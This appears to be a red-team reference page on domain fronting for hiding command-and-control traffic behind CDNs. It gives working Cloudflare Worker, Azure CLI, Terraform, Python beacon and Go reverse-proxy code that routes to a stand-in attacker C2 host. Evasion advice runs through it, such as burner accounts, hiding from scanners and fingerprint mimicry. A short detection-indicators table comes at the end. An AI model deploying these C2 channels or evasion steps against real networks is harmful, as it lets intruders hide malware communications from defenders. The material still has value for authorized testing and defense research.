# Domain Fronting

MITRE ATT&CK: **T1090.004 -- Proxy: Domain Fronting**

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Domain fronting exploits the discrepancy between two layers of host identification in an
HTTPS request. The **TLS SNI** (Server Name Indication) field -- visible to network
monitors -- carries a high-reputation domain, while the **HTTP Host header** -- encrypted
inside the TLS tunnel -- carries the true destination (the attacker's C2 endpoint). A CDN
edge server terminates TLS, reads the Host header, and routes the request to the origin
specified by that header, effectively laundering the traffic through a trusted domain.

```
                        TLS tunnel (encrypted)
 Client ──────────────────────────────────────────── CDN Edge
   │  SNI: allowed.example.com                          │
   │  (visible to network monitor)                      │
   │                                                    │
   │  ┌──────────────────────────────────┐              │
   │  │ GET / HTTP/1.1                   │              │
   │  │ Host: attacker-c2.cdn.net  ◄─────┼── only CDN  │
   │  │ ...                              │   sees this  │
   │  └──────────────────────────────────┘              │
   │                                                    │
   │                              CDN routes to ────► C2 Origin
```

A network defender performing TLS inspection sees only the SNI field, which resolves to a
legitimate, categorized domain. The actual C2 destination is hidden inside the encrypted
stream. This technique has been used extensively by APT groups and commodity frameworks
alike, prompting major CDN providers to begin enforcing SNI-Host header consistency.

## CDN Architecture That Enables Domain Fronting

```
 ┌─────────────┐        ┌────────────────────┐       ┌──────────────┐
 │   Client     │──TLS──►│  CDN Edge Server   │──HTTP──►│  C2 Origin   │
 │ SNI=good.com │        │                    │       │  (attacker)  │
 └─────────────┘        │ 1. Terminates TLS  │       └──────────────┘
                         │ 2. Reads Host hdr  │
                         │ 3. Routes by Host  │
                         └────────────────────┘
```

The key architectural property: CDN edge servers route **by Host header**, not by SNI.
The SNI is used only for TLS certificate selection. As long as the CDN holds a valid
certificate that covers the SNI domain, the TLS handshake succeeds, and subsequent HTTP
routing is independent of the SNI value.

## Implementation Approach 1 -- Cloudflare Workers

Deploy a Cloudflare Worker that acts as a reverse proxy, forwarding requests to the
actual C2 server. The client connects to `legitimate-looking.workers.dev`; the Worker
fetches from the real C2 and relays the response.

```python
# --------------------------------------------------------------------------
# Cloudflare Worker (JavaScript, deployed via wrangler CLI)
# --------------------------------------------------------------------------
# This Worker proxies every incoming request to the real C2 origin.
# From the network perspective, all traffic goes to *.workers.dev, a
# domain categorized as "Technology / CDN" by most URL categorization
# engines -- low suspicion.
#
# OPSEC NOTE: Cloudflare logs Worker invocations. Use a burner account
# registered through a VPN.  Workers have CPU-time limits (10 ms on the
# free plan) so keep payloads small.
#
# DETECTION SURFACE: Unusual volume of POST requests to a workers.dev
# subdomain may trigger anomaly-based rules.
# --------------------------------------------------------------------------

WORKER_JS = """
export default {
  async fetch(request) {
    // Re-write the destination to the actual C2 server.
    const c2 = "https://c2.attacker-infra.example.com";
    const url = new URL(request.url);
    url.hostname = new URL(c2).hostname;
    url.protocol = "https:";

    // Forward the request, preserving method, headers, and body.
    const modifiedRequest = new Request(url.toString(), {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });
    return fetch(modifiedRequest);
  }
};
"""
```

## Implementation Approach 2 -- Azure CDN / Azure Functions

Front the C2 behind an Azure CDN endpoint. The client's TLS connection shows an SNI of
`*.azureedge.net`, which is broadly categorized as Microsoft infrastructure.

```python
# --------------------------------------------------------------------------
# Azure CDN configuration concept (Azure CLI)
# --------------------------------------------------------------------------
# 1. Create a CDN profile and endpoint that points to the C2 origin.
# 2. The endpoint gets a hostname like <name>.azureedge.net.
# 3. Client connects to <name>.azureedge.net; CDN forwards to C2.
#
# OPSEC NOTE: Azure has increasingly enforced origin validation.  As of
# 2025, Standard Microsoft CDN profiles validate that the origin is
# reachable and may block suspicious origins.  Classic Verizon/Akamai
# tiers had looser enforcement -- always test in your lab first.
#
# DETECTION SURFACE: Persistent, periodic HTTPS connections to a single
# azureedge.net hostname from an endpoint that normally does not use
# Azure CDN.
# --------------------------------------------------------------------------

AZURE_SETUP = """
az cdn profile create --name frontprofile --resource-group rg-red \\
    --sku Standard_Microsoft

az cdn endpoint create --name fronted-endpoint \\
    --profile-name frontprofile --resource-group rg-red \\
    --origin c2.attacker-infra.example.com \\
    --origin-host-header c2.attacker-infra.example.com
"""
```

## Implementation Approach 3 -- AWS CloudFront

Create a CloudFront distribution with a custom origin pointing to the C2 server. Client
traffic appears destined for `*.cloudfront.net`.

```python
# --------------------------------------------------------------------------
# AWS CloudFront distribution (Terraform snippet for reference)
# --------------------------------------------------------------------------
# OPSEC NOTE: AWS began blocking domain fronting on CloudFront in April
# 2018 by enforcing that the Host header matches the distribution's
# configured CNAME or default domain.  However, if you *own* the
# distribution, the Host header will match because CloudFront itself
# forwards to your origin -- the fronting is implicit.  The SNI seen by
# a network monitor is *.cloudfront.net.
#
# DETECTION SURFACE: CloudTrail logs every distribution creation.  Use a
# throwaway AWS account.  Defenders can alert on new CloudFront origins
# that resolve to known-bad IP ranges.
# --------------------------------------------------------------------------

CLOUDFRONT_TF = """
resource "aws_cloudfront_distribution" "c2_front" {
  origin {
    domain_name = "c2.attacker-infra.example.com"
    origin_id   = "c2Origin"
    custom_origin_config {
      http_port              = 80
      https_port             = 443
      origin_protocol_policy = "https-only"
      origin_ssl_protocols   = ["TLSv1.2"]
    }
  }

  enabled = true

  default_cache_behavior {
    allowed_methods        = ["GET", "HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
    cached_methods         = ["GET", "HEAD"]
    target_origin_id       = "c2Origin"
    viewer_protocol_policy = "https-only"

    forwarded_values {
      query_string = true
      headers      = ["*"]
    }
  }

  restrictions {
    geo_restriction { restriction_type = "none" }
  }

  viewer_certificate {
    cloudfront_default_certificate = true   # uses *.cloudfront.net cert
  }
}
"""
```

## Python Client -- Mismatched SNI and Host Header

```python
"""
Domain-fronting client using the requests library with a custom SSL context.
The SNI is set to the fronting domain while the Host header targets the C2.

OPSEC NOTES (read every comment):
"""

import ssl
import socket
import requests
from urllib3.util.ssl_ import create_urllib3_context
from requests.adapters import HTTPAdapter

# -- Configuration -----------------------------------------------------------
FRONT_DOMAIN  = "allowed.cdn.example.com"   # SNI -- visible on the wire
C2_HOST       = "c2.attacker.example.com"   # Host header -- encrypted
C2_URL        = f"https://{FRONT_DOMAIN}/beacon"
# OPSEC: The FRONT_DOMAIN must be served by the same CDN that hosts the C2
# distribution.  If the CDN sees an SNI it does not serve, TLS fails.
# DETECTION: If a defender decrypts TLS (corporate proxy), the Host header
# mismatch is immediately visible.  Domain fronting is NOT effective against
# TLS-intercepting proxies.

class FrontingAdapter(HTTPAdapter):
    """
    Custom adapter that overrides the SNI sent during TLS negotiation.
    The requests library normally derives SNI from the URL hostname, which
    is fine for normal usage.  Here we force the SNI to FRONT_DOMAIN while
    the Host header (set below) points to the C2.
    """
    def __init__(self, sni_host, **kwargs):
        self._sni_host = sni_host
        super().__init__(**kwargs)

    def init_poolmanager(self, *args, **kwargs):
        # OPSEC: server_hostname controls the SNI extension in ClientHello.
        # Wireshark will show this value in cleartext during the handshake.
        kwargs["server_hostname"] = self._sni_host
        super().init_poolmanager(*args, **kwargs)

# -- Build session -----------------------------------------------------------
session = requests.Session()
session.mount("https://", FrontingAdapter(sni_host=FRONT_DOMAIN))

# OPSEC: Set a realistic User-Agent.  Many C2 frameworks ship with default
# User-Agent strings that are signatured by IDS/IPS.  Match the UA to the
# JA3 fingerprint you are presenting (see ja3-randomization.md).
session.headers.update({
    "Host": C2_HOST,          # <-- routed by CDN edge, invisible to monitor
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
})

# -- Beacon ------------------------------------------------------------------
# DETECTION: Fixed beacon intervals are trivially detected via time-series
# analysis.  Always add jitter (see ../../11-command-and-control/c2-infrastructure.md).
response = session.get(C2_URL, timeout=30)
# Process tasking from C2 ...
```

## Go Server-Side -- Minimal Reverse Proxy

```go
// --------------------------------------------------------------------------
// Minimal reverse proxy that accepts domain-fronted connections.
// Deploy this behind the CDN origin so the CDN forwards traffic to it.
//
// OPSEC: Bind only on 127.0.0.1 or a private interface if the CDN pulls
// from a known IP range.  Exposing the C2 port to the public internet
// means scanners (Censys, Shodan) will fingerprint it.
//
// DETECTION: If the origin server responds with unusual headers or TLS
// certificates that do not match the fronting domain, a savvy analyst
// inspecting CDN logs can identify the anomaly.
// --------------------------------------------------------------------------

package main

import (
    "log"
    "net/http"
    "net/http/httputil"
    "net/url"
)

func main() {
    // The C2 backend -- this is where tasking logic lives.
    backend, _ := url.Parse("http://127.0.0.1:8080")
    proxy := httputil.NewSingleHostReverseProxy(backend)

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        // OPSEC: Validate a shared secret header to reject scanners.
        if r.Header.Get("X-Request-ID") != "expected-token" {
            http.NotFound(w, r)  // look like a 404 to scanners
            return
        }
        proxy.ServeHTTP(w, r)
    })

    // DETECTION: A CDN origin responding on 443 with a self-signed or
    // mismatched certificate is a strong signal.  Use a Let's Encrypt
    // certificate for the actual C2 domain.
    log.Fatal(http.ListenAndServeTLS(
        ":443", "cert.pem", "key.pem", nil,
    ))
}
```

## TLS Fingerprinting Concern

Domain fronting hides the destination, but the **TLS ClientHello** still reveals the
client application through its JA3 hash. If the JA3 does not match a legitimate browser,
a defender can flag the connection regardless of the SNI.

- Cobalt Strike's default JA3: `72a589da586844d7f0818ce684948eea`
- Chrome 124 on Windows: varies by build, but well-documented at ja3er.com

**Mitigation**: Pair domain fronting with JA3 randomization or mimicry (see
[ja3-randomization.md](ja3-randomization.md)).

## Current State (2025)

| CDN | Domain Fronting Status | Notes |
|---|---|---|
| AWS CloudFront | Blocked (Host must match distribution CNAME) | Owning the distribution still works as implicit fronting |
| Azure CDN | Partially enforced | Varies by SKU; test in lab |
| Cloudflare | Blocked for third-party domains | Workers-based proxying still viable |
| Google Cloud CDN | Blocked since 2018 | Strictly enforces SNI=Host |
| Fastly | Partially possible | Shared certificates create fronting opportunities |

OPSEC: Even where fronting is "blocked," edge cases exist. Always validate in a
controlled lab before assuming a technique works or does not work in production.

## Detection Indicators

| Indicator | Data Source | Detection Logic |
|---|---|---|
| SNI / Host header mismatch | TLS inspection proxy, Zeek `ssl.log` + `http.log` join | Alert when `ssl.server_name` differs from `http.host` for the same connection UID |
| JA3 fingerprint anomaly | Zeek `ssl.log`, Suricata `tls` event | JA3 hash not in whitelist of known-good browser hashes |
| Unusual CDN traffic volume | NetFlow / firewall logs | Endpoint suddenly sends sustained HTTPS traffic to `*.cloudfront.net` or `*.azureedge.net` with no business justification |
| Beacon periodicity | SIEM time-series analysis | Regular POST intervals (even with jitter) to a single CDN hostname |
| New CDN distribution | AWS CloudTrail, Azure Activity Log | `CreateDistribution` or CDN endpoint creation from an unfamiliar account |
| Domain age | Passive DNS enrichment | Fronting domain registered < 30 days -- correlate with traffic spike |

## Cross-References

- [Network Evasion Techniques](../../06-defense-evasion/network-evasion.md) -- strategic
  context for domain fronting within the broader defense-evasion kill chain phase.
- [C2 Infrastructure](../../11-command-and-control/c2-infrastructure.md) -- how domain
  fronting fits into multi-tier redirector architectures.
- [JA3 Randomization](ja3-randomization.md) -- complementary technique to avoid TLS
  fingerprint-based detection when using domain fronting.
